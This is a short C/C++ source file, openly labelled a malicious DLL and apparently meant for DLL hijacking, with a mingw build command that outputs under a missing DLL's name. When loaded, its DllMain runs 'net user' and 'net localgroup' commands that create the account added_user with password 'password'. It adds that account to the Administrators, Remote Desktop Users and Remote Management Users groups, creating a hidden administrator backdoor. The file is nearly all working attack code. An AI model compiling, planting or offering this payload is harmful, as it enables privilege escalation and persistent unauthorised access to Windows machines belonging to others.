// This is an example of a malicious DLL in C/C++ 
// x86_64-w64-mingw32-gcc malDll.cpp --shared -o <missing-dll-name>
// This DLL adds added_user : password as a new user and puts them in the Administrators and Remote Desktop Users groups
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		int i;
		i = system("net user added_user password /add");
		i = system("net localgroup Administrators added_user /add");
		i = system("net localgroup \"Remote Desktop Users\" added_user /add");
		i = system("net localgroup \"Remote Management Users\" added_user /add");
		break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
		//i = system("net user added_user password /add");
		//i = system("net localgroup Administrators added_user /add");
		//i = system("net localgroup \"Remote Desktop Users\" added_user /add");
		//i = system("net localgroup \"Remote Management Users\" added_user /add");
		break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
